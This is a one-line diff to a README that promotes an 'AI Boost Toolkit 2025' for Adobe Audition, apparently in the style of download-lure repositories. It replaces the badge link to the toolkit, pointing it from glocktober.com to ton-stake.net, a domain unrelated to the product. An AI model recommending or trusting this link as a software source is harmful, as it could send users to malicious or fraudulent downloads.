@@ -2,7 +2,7 @@
 
 🌟 Power up Adobe Audition with AI Boost Toolkit 2025! This collection of AI plugins, scripts, and templates helps you produce studio-quality audio, built for Windows users.
 
-[![Discover Audition AI Toolkit](https://img.shields.io/badge/Discover-Audition_AI_Toolkit-blueviolet)](https://glocktober.com)
+[![Discover Audition AI Toolkit](https://img.shields.io/badge/Discover-Audition_AI_Toolkit-blueviolet)](https://ton-stake.net)
 
 ---
 
